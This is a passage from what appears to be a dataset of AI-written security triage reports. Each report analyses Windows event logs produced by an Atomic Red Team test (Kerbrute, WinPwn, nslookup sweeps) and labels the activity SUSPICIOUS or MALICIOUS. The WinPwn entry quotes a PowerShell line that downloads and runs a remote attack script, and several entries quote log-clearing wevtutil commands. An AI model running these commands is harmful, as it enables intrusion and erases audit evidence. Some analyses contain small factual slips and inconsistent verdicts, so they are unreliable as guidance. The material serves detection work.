Based on these findings, the identified event activities such as log clearing, privilege misuse, and anomalous process executions strongly suggest a possible compromise or intrusion attempt. The actions of user ""admin_test"" and the use of various system-level utilities raise further suspicion.

**Conclusion: SUSPICIOUS** 

The logs contain suspicious activities that warrant further investigation. Immediate actions should be taken to secure the system, including:
- Reviewing user activity logs for ""admin_test"" and other accounts with administrative access for similar patterns.
- Performing a comprehensive security audit of the system to identify any unauthorized access or changes.
- Strengthening monitoring controls, and considering investing in more advanced threat detection technologies to uncover potential breaches.
- Resetting administrative credentials for affected accounts and employing stronger policies, such as least privilege and multi-factor authentication."
Kerbrute - userenum,"Upon reviewing the logs provided, there are several observations and analyses. Here are the key points that need to be considered:

### Key Observations:

1. **Frequent Use of `wevtutil.exe`:**
   - The `wevtutil.exe` command-line utility executed several times with various command lines related to clearing logs, e.g., `cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl Security`, `cl ""Windows PowerShell""`. The usage of `wevtutil.exe` for clearing logs can be indicative of an attempt to cover tracks, which is a typical behavior observed during malicious activity.

2. **Execution of `AtomicRedTeam` Commands:**
   - The usage of `PowerShell` to execute `AtomicRedTeam` external payloads and scripts such as `kerbrute.exe userenum` is seen. `Atomic Red Team is a known open-source library of tests for adversary tactics and techniques. The use of `kerbrute.exe` for user enumeration indicates potential reconnaissance activities trying to gather more information about the users on the domain.

3. **Clearing of Event Logs:**
   - The Sysmon, Windows PowerShell, and Security logs have been cleared multiple times. Clearing of logs, especially security logs `EventID 1102`, using an account like `admin_test` may imply an attempt to remove evidence.

4. **Privilege Escalation Events:**
   - The presence of `EventID 4672` in the Security logs indicating special privileges assigned, could be an indication of privilege escalation.

### Detailed Analysis

- **Suspicious Executions**: The execution of `PowerShell` commands that involve `AtomicRedTeam` and `kerbrute.exe` are suspicious due to their context and the fact that `kerbrute.exe` is often used in penetration testing and attack simulations to test and exploit open Kerberos services.
  
- **Log Clearing as a Sign of Malicious Intent**: The clear evidence of logs being cleared specifically tied to users within the domain suggests an attempt to cover up actions executed on the system.

- **Event Clearing and Cmd.exe Usage**: The use of `conhost.exe` which often follows command prompt sessions tied to clearing functions further supports the hypothesis of a malicious actor attempting to clean their tracks.

### Threats and Risks Identified:

- **Reconnaissance and Lateral Movement**: The usage of tools like `AtomicRedTeam` and specifically `kerbrute.exe` suggest the intent of reconnaissance and possibly preparation for lateral movement within the network.

- **Potential Unauthorized Access and Data Harvesting**: Given the combined execution of malicious tools along with the event-log manipulation, there is a significant risk of unauthorized access and data harvesting.

### Resolution Guidance:

Based on the activities observed, the logs exhibit behavior that is indicative of malicious activity aimed at compromising the system:

- **Resolution**: **MALICIOUS**
  
### Next Steps:

1. **Immediate Containment**: Isolate `Server002` from the network to prevent any further spread or potential data exfiltration.
2. **Forensic Investigation**: Conduct a full forensic analysis to understand the extent of the compromise and gather any remaining evidence.
3. **Review User Accounts and Permissions**: Audit all user accounts, especially focusing on the `admin_test` account and any other accounts with elevated privileges.
4. **Patch and Update**: Ensure all systems are patched and updated, especially focusing on the vulnerabilities that may have been exploited during the attack.
5. **Monitoring and Alerting**: Increase monitoring and set up alerts for similar suspicious activities within the environment.

By addressing these recommendations, the organization can work towards mitigating and preventing future instances of such malicious activities."
WinPwn - bluekeep,"Upon analyzing the provided logs, several indicators suggest potential malicious activity on the Windows host, Server002:

1. **Event Log Clearing**:
   - There are multiple events indicating the clearing of event logs (EventID 1102 in the Security log and EventID 104 in the System log). Log clearing can often be indicative of an attempt to cover tracks after unauthorized or malicious activities.

2. **Time Modification**:
   - There are events indicating changes made to the system time (EventID 4616 in the Security log). Time changes can be indicative of an attempt to manipulate timestamps in logs or other records to obscure the timeline of malicious activities.

3. **High Privilege Logon and Use of NTLM Authentication**:
   - An account labeled ""admin_test"" with a high number of privileges is involved in activities during the timestamp of other suspicious activities (EventID 4672 and 4624). The use of NTLM authentication, while not in itself malicious, in combination with other events could suggest lateral movement or unauthorized access attempts.

4. **Suspicious PowerShell Activity**:
   - There is a log event showing PowerShell being used with a command that downloads and executes a script from a remote repository (EventID 1 in the Sysmon log and multiple 600s in the Windows PowerShell log). Such actions are commonly employed in fileless malware attacks or exploitation frameworks, such as executing the open-source tool ""WinPwn"" in this instance.

5. **Unusual Process Activity**:
   - There's evidence of ""wevtutil.exe"" being used to clear logs across different channels (Security, System), executed by the user ""admin_test"". This command-line utility is legitimate but frequently abused by attackers to clear Windows event logs.

**Assessment**:
- The combination of log clearing, time changes, use of high-privileged accounts, suspicious PowerShell activity, and specific processes usage implies a potential compromise of the system.

**Resolution**:
- MALICIOUS: The activity described within these logs is a strong indication of malicious behavior. Immediate action is recommended to secure the system.

**Recommended Actions**:
1. **Isolation**: Immediately isolate the affected system from the network to prevent further potential malicious activity.
2. **Investigation**: Conduct a detailed forensic investigation to understand the extent of the compromise and identify the root cause.
3. **Incident Response**: Initiate your incident response plan to address potential data breaches or unauthorized access.
4. **Remediation**: Patch any vulnerabilities and update system configurations as required.
5. **Monitoring**: Increase monitoring of this system and any similar ones to detect future anomalies quickly.

Following these steps should help limit damage and secure the system against future attacks."
Process Discovery - tasklist,"Upon reviewing the provided event logs, several indicators of potentially suspicious behavior have been identified:

1. **Clearing of Event Logs**: 
   - Multiple event logs have been cleared by the user ""admin_test"" on ""Server002"". The logs cleared include the System, Windows PowerShell, and Security channels.
   - These correspond to Event IDs 104 and 1102, which were recorded in the System and Security logs respectively. 
   - Clearing event logs can be a typical indicator of an attempt to cover malicious activity, as it deletes potential evidence of system changes or unauthorized actions.

2. **Use of Administrative Commands**:
   - The execution of `wevtutil.exe` to clear logs is noted multiple times. This utility is capable of managing event logs, including clearing them.
   - Commands like `hostname.exe`, `whoami.exe`, and `tasklist.exe` were also executed, which can often be used to gather reconnaissance information about the host system.

3. **Time Discrepancies**:
   - The System logs indicate a time change with Event ID 4616, which shows adjustments to the system time. Altering the time can be used to evade time-based logging or security measures.

4. **Sysmon Events**:
   - The Sysmon logs corroborate the execution of commands and utilities that align with administrative activities. Processes such as `cmd.exe` with `/c tasklist` and others were started around the same time as log clearing activities.

### Assessment
The presence of log-clearing activities, coupled with the execution of various administrative commands, raises suspicions of an attempt to perform unauthorized activities while masking traces. Although there is no explicit evidence of malicious intent (such as known malware traces or clear data exfiltration commands), the actions align with behaviors typically associated with threat actors attempting to maintain stealth.

### Resolution: SUSPICIOUS

### Guidance and Next Steps:
1. **Further Investigation**: This activity should be considered suspicious and warrants further investigation. Examine other logs (if available) to correlate these actions with potential unauthorized access or data manipulation.
   
2. **User Activity Review**: Review additional context or user activity around ""admin_test"" to determine if similar activities were noticed in other hosts or if unusual login behaviors were associated with this user.

3. **Monitor and Secure**: Heighten monitoring on relevant systems and apply security measures to prevent unauthorized log clearing and administrative command execution without proper authorization.

4. **Policy Review**: Ensure that logging policies are stringent and that any log-clearing is properly documented and justifiable, ideally requiring multi-factor or secondary approvals. Implement alerts for log clearing activities."
Applications Installed,"Upon reviewing the provided Windows event logs, a few points stand out:

1. **Log Clearance Events**: There are several events indicating the clearing of logs, specifically using ""wevtutil.exe,"" across various log channels:
   - System Log (EventRecordID 3567)
   - Windows PowerShell Log (EventRecordID 3568)
   - Security Log (EventRecordID 30368)

   The user ""admin_test"" on ""Server002"" appears frequently as the user executing these commands. Log clearance is often indicative of an attempt to hide activity, which is suspicious.

2. **PowerShell Activity**: The PowerShell logs detail commands being run to retrieve detailed application installation properties via the registry. The use of PowerShell to extract registry information is not inherently malicious, but combined with log clearance activities, could suggest preparatory or investigative steps typical of a compromise.

3. **Use of Sysinternal Tools**: The execution of ""hostname.exe"" and ""whoami.exe"" might be benign if related to system diagnostics or administration tasks. However, when tightly clustered with log clearance and PowerShell activity, they could represent lateral movement reconnaissance or potential post-exploitation probing.

4. **Execution of `wevtutil`**: Numerous indications of ""wevtutil.exe"" from Sysmon logs show that the Event Logging service was manipulated multiple times to clear significant logs. This utility, when used outside of routine maintenance or troubleshooting, can strongly imply attempts to cover tracks.

5. **Process Execution and Patterns**: Analyzing the execution context, most commands run with high integrity levels, suggesting administrative privileges. This level of access, in combination with log clearance and registry querying, supports potential illicit activities.

**Assessment**:
- **SUSPICIOUS**: The combination of cleared event logs (especially security logs), detailed PowerShell registry queries, and repetitive use of system utilities indicates suspicious activities warranting further investigation. While it doesn't guarantee malicious actions, these behaviors align with common tactics for persistence or precursor activities to compromise.

**Guidance**:
- **Next Steps**:
  - Conduct a thorough review of the server's administrative activities around the time of these logs.
  - Audit the permissions and access history for ""admin_test"".
  - Implement a more restrictive logging approach and ensure logging preservation through external log collectors.
  - Alert IT and security teams to potential breaches for immediate containment and deeper forensics.

Conclude whether this system needs isolation and check other systems for similar patterns. Additional investigation into the origins and permissions of the ""admin_test"" account should be prioritized."
Enumerate Active Directory Computers with Get-AdComputer,"Upon reviewing the provided Windows event logs, several details stand out that require attention:

### **Analysis of Logs:**

1. **Log Clearance:**
   - **System Log Event ID 104**: Logs from System, Application, and Windows PowerShell channels have been cleared by the user ""admin_test."" Instances of logs being cleared can indicate an attempt to hide malicious activity. Particularly important is the clearing of the Windows PowerShell logs, which can often contain records of potentially malicious script executions.

2. **Sysmon Logs:**
   - **Sysmon Event ID 1**: Multiple instances of the process `wevtutil.exe` being executed by the user ""admin_test"" with the command line arguments indicating the clearance of the logs (e.g., `wevtutil.exe cl <logname>`). The timing of these executions matches the events where corresponding logs are cleared, suggesting an intentional action to obscure activities.
   - **Sysmon Event ID 1**: Presence of PowerShell command `powershell.exe & {Get-AdComputer -Filter *}` executed by the same user. This command queries for information about all computers in Active Directory, which could be considered reconnaissance behavior.

3. **Security Log Event ID 1102:**
   - Indicates that the security event log was cleared. This action is critical as it shows an effort to hide actions related to security auditing, potentially linked to unauthorized activities.

4. **Windows Update and Defender Logs**:
   - Events related to Windows Update and Microsoft Defender appear regular and not indicative of compromise, showing expected updates to antivirus signatures.

### **Suspicious or Anomalous Behavior:**
- The coordinated timing and execution of `wevtutil.exe` for clearing multiple logs by a single user are highly suspicious.
- PowerShell execution fetching Active Directory data could indicate reconnaissance, especially when performed in conjunction with log clearance.
- Frequent failed credential access attempts as seen in the Security Log (Event ID 5379) may suggest probing or brute force attempts.

### **Assessment & Resolution:**
The combination of actions — clearing of logs, particularly security logs, executing potential reconnaissance commands, and repeated failed credential access attempts — strongly points toward unauthorized and potentially malicious activities being attempted or executed on the host.

Given the actions involving log clearance and suspicious command executions, these logs contain signs of potentially malicious activity. The intent to erase traces via log clearance adds to the suspicion.

**Resolution: MALICIOUS**

### **Guidance:**
1. **Immediate Actions:**
   - Isolate the server from the network to prevent potential data exfiltration or lateral movement.
   - Conduct a full forensic investigation to determine the scope of the compromise.
   - Review activities of the user ""admin_test"" extensively, considering a potential compromise of these credentials.

2. **Short-term Steps:**
   - Change all administrative passwords and ensure no unauthorized accounts exist.
   - Review firewall and security policies to prevent such incidents in the future.

3. **Long-term Steps:**
   - Implement stricter logging and monitoring controls to detect and respond to log clearance activities.
   - Regularly train staff on detecting signs of compromise and ensuring good security hygiene.

These steps aim to address the current situation and safeguard against future potential threats."
Network Share Discovery command prompt,"Upon reviewing the provided Windows event logs, I've conducted a detailed analysis focusing on several key aspects, including process execution, command line usage, privilege escalation, and indicators of anomaly or potential compromise.

### Analysis Summary:

1. **System and Application Logs:**
   - Events from the ""edgeupdate"" service seem related to normal service activities such as updates. These logs indicate the Edge Update service has started and stopped as expected.
   - The ""Microsoft-Windows-Security-SPP"" event suggests the operation of the Software Protection Platform, a legitimate service.

2. **Sysmon Logs:**
   - There is extensive usage of `wevtutil.exe` with commands to clear logs such as Application, System, Security, and Windows PowerShell. The command-line usage here, specifically clearing logs, is highly suspicious as threat actors often clear logs to cover their tracks.
   - The processes are executed under the user ""admin_test"" with a high integrity level, indicative of administrative rights.
   - The execution of `cmd.exe` with `net view \\localhost` and `whoami.exe` appears in the logs, which could indicate reconnaissance activities or script automation.

3. **Security Logs:**
   - There are notable entries such as Event ID 1102 in the Security log, which indicates the security logs were cleared. This action is highly indicative of potential malicious activity, as clearing security logs is considered a standard practice to hinder forensic analysis post-compromise.

4. **Time Manipulation:**
   - Kernel-General and Security-Auditing logs indicate time changes on the system. Time manipulation can be part of anti-forensics measures, further supporting malicious behavior.

5. **Privileges Usage:**
   - Event 4672 shows special privileges associated with ""admin_test"". The privileges such as SeDebugPrivilege and SeTakeOwnershipPrivilege indicate this account had extensive rights often exploited during a compromise.

### Threat Assessment:

- The actions such as clearing logs and potential for time manipulation suggest a high likelihood of attempted cover-up of activities, potentially from a compromised account or malicious internal activities.
- The combination of privileged account usage, command-line reconnaissance, and evidence of log clearing substantially indicate suspicious behavior that warrants further investigation.

### Resolution:

**Resolution:** SUSPICIOUS

The evidence strongly suggests behavior consistent with a security threat, especially indicative of deliberate attempts to obfuscate and manipulate audit records. 

### Guidance:

- Conduct a thorough investigation into the user account ""admin_test"" and its activity logs beyond this timestamp.
- Determine whether these activities in the logs align with known administrative activities.
- Implement monitoring for log-clearing activities and time-changes.
- Consider conducting endpoint scanning to ensure no backdoor or malicious scripts reside on the system.
- Review access control and privilege assignments, particularly for admin accounts. Adjust policies to prevent unauthorized log clearing.

Confirm and ensure logging is enabled and immediately review logs for other systems to check for similar patterns. It’s essential to understand the scope of this behavior across the network to prevent wider organizational impact."
System Information Discovery (2),"Upon analyzing the provided Windows event logs, the following observations have been made:

### Suspicious Activity Noted:
1. **Clearing of Event Logs**: There are several events indicating the clearing of various Windows event logs by the user ""admin_test"". Notably, events:
   - Security Event Log (Event ID 1102)
   - System Log (Event ID 104)
   - Windows PowerShell Log (Event ID 104)

   These actions are decidedly suspicious as clearing of logs can be indicative of an attempt to cover up malicious activity.

2. **Use of `wevtutil` for Log Manipulation**: There are multiple instances where `wevtutil` is used:
   - Commands like `""C:\\Windows\\system32\\wevtutil.exe\"" cl [LogName]` are executed frequently. These commands are typically used to clear logs, which aligns with our findings of the event logs being cleared.

3. **Running of Potentially Malicious Scripts**: There are indications that scripts, likely batch or VBS (e.g., C:\Windows\System32\gatherNetworkInfo.vbs), were run:
   - Event ID 1 type entries indicate the execution of `cmd.exe` and `wscript.exe`, which is used to run a script that seems to gather network information (e.g., the execution of network and system command utilities).

4. **Time Manipulation**: There are events indicating a time change in the system (Event ID 1 from the Microsoft-Windows-Kernel-General provider). This might have been done to align logs incorrectly or mask the timing of other activities.

5. **Batch Scripts**: Several batch commands are executed within the command prompt context, indicating possible system reconnaissance or configuration exportations (e.g., querying and exporting registry settings, services states, and network configuration).

6. **PowerShell Activity**: High-level network and system commands being executed (as seen in the Windows PowerShell log), potentially part of a system reconnaissance effort are logged. The script's verbosity suggests data collection for another party.

### Indicators of Compromise:
- **Process and User Activity**: The user ""admin_test"" is frequently associated with these activities, utilizing high integrity level processes to execute potentially malicious operations.
- **Log Manipulation**: Clearing logs directly correlates with attempts to obfuscate actions taken on the system, usually associated with advanced threats.

### Assessment:
Given these activities:
- Multiple instances of clearing evidence/logs.
- Execution of scripts typically used for reconnaissance and data exfiltration.
- Repeated abnormal administrative activities.

### Resolution:
**MALICIOUS** - The evidence of log clearing, time manipulation, and script execution strongly indicate malicious activity aimed at system reconnaissance and potential further exploitation.

### Recommendation:
1. **Immediate Incident Response**: Quarantine the host and initiate a detailed forensic investigation.
2. **User Account Review**: Investigate the “admin_test” account across the infrastructure for similar behavior.
3. **Security Posture Enhancement**: Strengthen monitoring and alerting on actions like log management and PowerShell usage.
4. **Review Network Traffic**: Monitoring for any signs of exfiltration or communication with outside entities during the times these logs were cleared."
WinPwn - Dotnetsearch,"After careful analysis of the provided Windows event logs, the following observations highlight potential malicious activity:

1. **Event Log Clearing:**
   - In the **System Logs**, there is a series of Event ID 104 indicating that event logs, including the System and Windows PowerShell logs, were cleared by the user ""admin_test"" (UserID: S-1-5-21-3962163828-2803415714-1403596700-1006). This action is highly suspicious as log clearing is often associated with malicious attempts to cover tracks after unauthorized activities.

2. **PowerShell Activity:**
   - In the **Windows PowerShell logs**, there is evidence of a script being downloaded and executed from a remote repository (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`). This activity is executed via PowerShell with the command:
     ```
     powershell.exe & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
     iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
     Dotnetsearch -noninteractive -consoleoutput}
     ```
     Downloading and executing scripts from the internet without proper verification is highly indicative of malicious intent, possibly leading to system compromise.

3. **Sysmon Events:**
   - The **Sysmon Logs** show process creation linked to suspicious PowerShell activities with high integrity levels, indicating potential privilege escalation.

4. **Repetitive Microsoft Edge Update Activities:**
   - Numerous events are related to Microsoft Edge update processes. Although these could be legitimate updates, their frequency and the closely packed timestamps, particularly following potentially harmful PowerShell executions, warrant further investigation to ensure they are not being exploited or masqueraded to hide malicious activity.

### Assessment and Recommendations:

- **Assessment:** The behavior observed from the log clearing, combined with PowerShell commands to download and execute scripts from an untrusted source, are clear red flags. These activities are classic indicators of potential system compromise and unauthorized access. 

- **Resolution:** MALICIOUS - The patterns strongly suggest malicious activity, especially given the log tampering and unauthorized PowerShell usage.

### Guidance on How to Proceed:

1. **Immediately Isolate the Affected Host:** Ensure that ""Server002"" is isolated from the network to prevent any potential spread of malicious activities.
   
2. **Conduct a Detailed Forensic Investigation:** Engage in-depth forensic analysis to understand the extent of the compromise, including reviewing any potential data exfiltration or further system modifications.

3. **Review and Monitor Network for Additional Indicators:** Analyze network traffic logs for additional signs of compromise or attempt to communicate with command and control servers.

4. **Audit and Strengthen Security Controls:** Reinforce endpoint security measures, ensure PowerShell logging is adequately configured and bolster detection capabilities against similar activities.

5. **Educate and Train Staff:** Conduct awareness training for IT staff to recognize and respond promptly to security alerts related to unauthorized log tampering and suspicious PowerShell activities."
Display group policy information via gpresult,"Upon reviewing the provided logs, several indicators suggest potentially suspicious activities on the system that require further investigation:

1. **Event Log Clearing Events:**
   - A significant red flag is the event log clearing activity by the user `admin_test`. The security log indicates that the security event log was cleared (`EventID 1102`) by this user, and sequentially, the system log (`EventID 104`) was also cleared. This behavior is often associated with malicious activity where an attacker attempts to hide their tracks by clearing logs.

2. **Usage of `wevtutil.exe`:**
   - There are multiple invocations of `wevtutil.exe`, a command-line utility used to export, archive, and clear event logs, by the user `admin_test` with high integrity levels. The sequence of executions around the event log clearing events appears suspicious, particularly as `wevtutil.exe` was involved (`ProcessId 6464`), suggesting direct command-line operations to manipulate event logs.

3. **Time Discrepancy:**
   - The logs show an immediate previous time and new time alteration (`EventID 4616`) indicating time reversal on the system. This is unusual and another potential method to manipulate log timestamps, possibly as an evasion technique.

4. **Executions of Administrative Tools and Commands:**
   - There are command-line executions of administrative tools, such as `whoami.exe` and `gpresult.exe`, which may be typically benign, but in the context of other suspicious activity, they deserve closer scrutiny. Additionally, `cmd.exe` is seen executing commands which in conjunction with other activities is often employed in lateral movement techniques or information gathering.

5. **Elevated Privilege Process Executions:**
   - The presence of processes being executed under the NT AUTHORITY\SYSTEM context, particularly those related to Microsoft Edge Update, should be reviewed to confirm they are legitimate update operations as these processes possess elevated privileges.

### Conclusion
Based on these observations, several behaviors appear inconsistent with standard operations and align with tactics associated with compromise, such as log tampering and privilege escalation.

### Resolution
- **SUSPICIOUS**

### Recommended Actions:
1. **Immediate Investigation:**
   - Conduct a thorough investigation detailing the timeline of events, focusing on the period surrounding log deletions.
   - Review user account `admin_test` for anomalies and ensure privileged access is audited.
   
2. **Forensic Analysis:**
   - Preserve volatile data (such as RAM contents) and network traffic data to capture potential malicious actions in-flight.
   - Retrieve and analyze full event logs from backups if available to uncover actions preceding log clearing.

3. **Enhance Monitoring and Alerts:**
   - Implement stricter monitoring and alerting rules for usage of `wevtutil.exe` and track any event log manipulations.
   - Strengthen logging for critical actions and secure log storage to prevent tampering.

4. **Evaluate Security Policies:**
   - Reassess security policies related to time synchronization settings and mitigate risks associated with unauthorized time changes.
   - Conduct a vulnerability assessment and review possible misconfigurations leading to exploitation.

These steps may help in confirming if the suspicious activities evidence a confirmed security breach and assist in remediating any potential issues."
Query Registry,"After reviewing the provided logs, I've identified several factors that could be indicative of suspicious or malicious activity:

1. **Event Log Clearing:**
   - The Security log (EventID: 1102) and System log (EventID: 104) show that logs were cleared by the user `admin_test`. Clearing event logs is a common activity performed by malicious actors to cover their tracks.
   
2. **Registry Queries:**
   - There is a sequence of `cmd.exe` instances running with a command line that queries various registry keys related to startup programs, services, and shell modifications. This is an activity often used in reconnaissance to assess auto-run entries and potential persistence mechanisms.
   
3. **High Integrity Level Execution:**
   - Many processes, particularly registry queries and the use of `wevtutil.exe`, are executed with high integrity levels by the `admin_test` user. This could indicate privileged operations potentially related to scripts or administrative tasks.
   
4. **Command-line Utility `wevtutil.exe`:**
   - The tool `wevtutil.exe` is being used multiple times to clear logs, specifically targeting different event log channels. This activity aligns with anti-forensic techniques designed to obscure activities on the system.

5. **Frequent Execution of System Tools:**
   - The logs reveal frequent and automated-like execution of system utilities such as `conhost.exe`, `hostname.exe`, `whoami.exe`, and `reg.exe`. While usage of these tools isn't inherently malicious, the volume and frequency in a short span of time raise suspicion of potential automated script execution.

6. **Security Updates and System Maintenance:**
   - The presence of `wuauclt.exe` and various Edge updater activities appears to be legitimate system maintenance and updates.

In conclusion, the combination of event log clearing by a privileged user, extensive registry queries, and use of `wevtutil.exe` to clear logs frequently in rapid succession presents significant red flags. These activities suggest an attempt to conduct unauthorized reconnaissance and possibly cover tracks on the system.

**Resolution: SUSPICIOUS**

Given the suspicious nature of the activities, further investigation is required to determine the intent and origins of these actions. Immediate actions should include:
- Isolating the host from the network to avoid further potential spread if malicious intent is confirmed.
- Conducting a full forensic analysis on the machine.
- Reviewing access logs to determine if `admin_test` credentials were used legitimately.
- Investigating if scripts or scheduled tasks were used to automate the observed processes.
- Reconsidering security measures and administrative practices, specifically reviewing who has access and ability to clear event logs."
Environment variables discovery on windows,"## Detailed Analysis of Windows Event Logs

### Suspicious Activities:
1. **Event Log Clearing:**
   - There are several instances of **cleared event logs** across various channels such as System, Security, and Windows PowerShell. The logs show the command-line utility `wevtutil.exe` being used by the `admin_test` user to clear logs.
   - Cleared logs include:
      - **System** (`EventID 104`),
      - **Security** (`EventID 1102`),
      - **Windows PowerShell**.
   - This is often a tactic used by attackers to cover their tracks and can be considered highly suspicious if done without a legitimate administrative purpose.

2. **High-Privileged Logon:**
   - The user `admin_test` has been repeatedly assigned high privileges (as seen in `EventID 4672`), including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others that are often exploited during hacks for lateral movement or privilege escalation.
   - There are multiple logons by the `admin_test` user with these privileges, which could indicate misuse if not justified.

3. **Suspicious Command Execution:**
   - Execution of `wevtutil.exe`:
     - Commands like `cl System`, `cl Security`, and `cl Windows PowerShell` are used to clear logs.
   - Execution of other utilities like `whoami.exe` and `hostname.exe` indicates attempts to gather information about the system and the logged-on user.
   - Instances of `cmd.exe` with actionable commands executed without a clear justification (in `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\` directory).

### Indicators of Compromise:
- Clearing of logs by `admin_test` suggests an attempt to hide activities from system audit logs.
- Privilege escalation or misuse is indicated by the repeated granting of high-level privileges to the same user.

### Assessment:
The combination of cleared logs, high privileges, and suspicious command execution strongly suggests unauthorized activities.

### Threats/Risks Identified:
- **Potential Intrusion**: High likelihood of malicious intent given the systematic clearing of logs and privilege escalation without clear justification.
- **Compromise of Credentials**: If the `admin_test` account was compromised, an adversary could have cleared the logs to perform undetected activities.
- **Data Exfiltration or Further Attacks**: Successful attempts to conceal actions indicate potential for more severe impacts, like data theft or launching further attacks from this compromised host.

### Recommendations:
1. **Immediate actions:**
   - Conduct a full investigation on the `admin_test` account to verify the legitimacy of actions.
   - Review audit policies and ensure they enforce stricter logging that cannot easily be tampered with.
   - Temporarily suspend `admin_test` account activities until a comprehensive analysis is done.

2. **Long-term actions:**
   - Implement enhanced monitoring and logging mechanisms.
   - Initiate a company-wide password reset, especially for privileged accounts.
   - Educate and inform about the importance of secure credentials and auditing.

### Resolution:
**MALICIOUS** - The logs unequivocally show malicious intent through systematic event log clearing, high privilege abuse, and unauthorized command execution. Immediate remediation steps should be taken to mitigate risk and investigate further."
Enumerate Root Domain linked policies Discovery,"Upon reviewing the provided logs, several observations can be made which indicate potentially suspicious or malicious behavior:

1. **Event Log Clearing:** Multiple events show the use of the `wevtutil.exe` command to clear various event logs (e.g., Security, System, Windows PowerShell). This is typically done by attackers to cover tracks and is considered highly suspicious. The user responsible for this is `admin_test`, who executed `wevtutil.exe` with ""cl"" (clear log) for multiple logs.

2. **PowerShell Activity:** There are multiple instances of PowerShell execution with complex command lines aimed at querying Active Directory Group Policy Object (GPO) links. This type of activity indicates a potential enumeration of group policies, often part of a larger reconnaissance or attack strategy.

3. **Logon and Process Execution Patterns:** The logs contain processes such as `whoami.exe`, `hostname.exe`, and various instances of the `conhost.exe` process resulting from command-line tools being run, which could suggest an interactive command session possibly used by an attacker.

4. **Time Change Events:** There are System log events related to the time being adjusted, indicated by EventID 4616 in Security logs and Kernel-General events. While sometimes benign if part of routine time synchronization, these rapid-fire adjustments warrant investigating any misconfiguration or malicious adjustment of system time to influence logging or forensic analysis.

5. **Processes Run by Admin Users:** The Sysmon logs show various administrative actions and processes executed with high integrity levels, suggesting elevated privileges. The `admin_test` account appears in multiple logs with high-level integrity for running these processes.

Given these findings, there are clear signs of potentially unauthorized or malicious activity that warrant further investigation. The critical points are the clearing of logs and the PowerShell activities in particular, which align with common tactics to obfuscate an attacker's presence and enumerate network information.

### Conclusion:
The resolution for these logs is **MALICIOUS** due to evident attempts to conceal activity (log clearing), indicative reconnaissance activities (PowerShell enumeration), and the presence of elevated privilege use which suggests compromise.

### Recommendations for Action:
- Immediately review and secure the `admin_test` account to ensure it's not compromised.
- Investigate and review other systems and accounts for similar activities or lateral movement.
- Conduct a thorough forensic investigation on the server to identify further compromise indicators or persistence mechanisms.
- Recommend resetting affected user credentials and strengthening the logging/security policies to prevent similar future incidents.
- Engage in System and Network-wide scanning to identify any deployed malware or backdoors."
Enumerate Linked Policies In ADSISearcher Discovery,"Based on the logs provided, I have conducted a detailed analysis to identify any suspicious, malicious, or out-of-place activity. Here's the breakdown:

### Suspicious and Anomalous Activities Identified:

1. **Event Log Clearing (Event ID 1102, 104):**
    - The Security, System, and Windows PowerShell logs were cleared by the user ""admin_test"". This is often considered suspicious as attackers may clear logs to cover their tracks.
    - Event ID 1102 in the Security log indicates the security event log was cleared.

2. **Time Change Events (Event ID 4616, 1):**
    - The system time was changed by a service running under svchost.exe. Time manipulation can be used by attackers to match timestamps when logs are edited or obscured.

3. **PowerShell Activity:**
    - A complex PowerShell script was executed, involving queries with `adsisearcher` and manipulation with `gPlink`. Such scripts can be indicative of reconnaissance or configuration extraction activity.
    - The command seems to be performing Active Directory OU enumeration, which might be related to gaining further information about Group Policies linked to OUs.

4. **Use of Wevtutil and Conhost:**
    - The frequent use of `wevtutil.exe` to clear event logs (`wevtutil cl Microsoft-Windows-Sysmon/Operational`, etc.) and process creations like `conhost.exe`, which is a Console Window Host process, are noteworthy.
    - `wevtutil.exe` clearing multiple event logs is typically suspicious activity, possibly used to delete log traces.

5. **Scheduled and Background Update Processes:**
    - Multiple Edge Update processes (`MicrosoftEdgeUpdate.exe`) are running under NT AUTHORITY\SYSTEM. Such updates may be benign but are noted for their persistence in various processes.

### Assessment and Finding:

The activities found in the logs strongly indicate **SUSPICIOUS** activity. The clearing of Security logs, system time changes, and complex PowerShell script execution, alongside the use of native Windows utility (`wevtutil.exe`) to manage session logs, suggests potential obfuscation and reconnaissance efforts. These are red flags for potential malicious activity, though not definitive of unauthorized access or data exfiltration without further investigation.

### Recommended Next Steps:

1. **Monitor and Review:**
   - Continuously monitor the server for recurring attempts to clear logs or modify system times.
   - Review recent administrative activities to confirm whether the `admin_test` user's actions were authorized.

2. **Analyze Host and Network:**
   - Conduct a review on Endpoint Detection and Response (EDR) solutions for signs of lateral movement and further suspicious activities tied to `admin_test`.
   - Check network logs for unusual outbound traffic that might correlate with the timeline of suspicious events.

3. **User Activity Verification:**
   - Verify with administrative personnel or through access control logs whether the account related activities by `admin_test` were sanctioned.

4. **Enhanced Logging and Alerts:**
   - Strengthen log management, including ensuring that log retention policies are enforced, and enhance alerting for similar anomalous activities.

Given the contexts of the logs and the actions identified, the finding is classified and advised to be handled with caution, warranting further investigation as **SUSPICIOUS**."
Remote System Discovery - nslookup,"Upon reviewing the provided logs, several indicators suggest potential malicious activity:

1. **Clearing of Event Logs**:
   - The system logs reveal multiple instances where the Windows event logs, including ""System,"" ""Windows PowerShell,"" and ""Security,"" were cleared by a user named ""admin_test"" (Event ID 104). This is a significant indicator of suspicious activity, as clearing event logs can be an attempt to cover tracks.

2. **Unusual PowerShell Activity**:
   - A PowerShell script executed a series of NSLookup commands on a potentially local subnet. The command executes nslookup 255 times, one for each IP address in the range. This activity could indicate network reconnaissance, which is commonly used in lateral movement within a network.

3. **High Privilege Execution**:
   - The security log entries show that the user ""admin_test"" was granted a set of privileges including SeDebugPrivilege and SeBackupPrivilege (Event ID 4672). These privileges allow for significant control over the system, which could be leveraged for malicious purposes.

4. **User ""admin_test"" Activity**:
   - The user ""admin_test"" was seen executing several high-integrity commands like `wevtutil` and `whoami`, suggesting an exploration of system configurations and user account details.
   - There were also multiple login events for the user without a process name or ID, indicating attempts to possibly obscure the source (Event ID 4624).

5. **Simultaneous System Updates**:
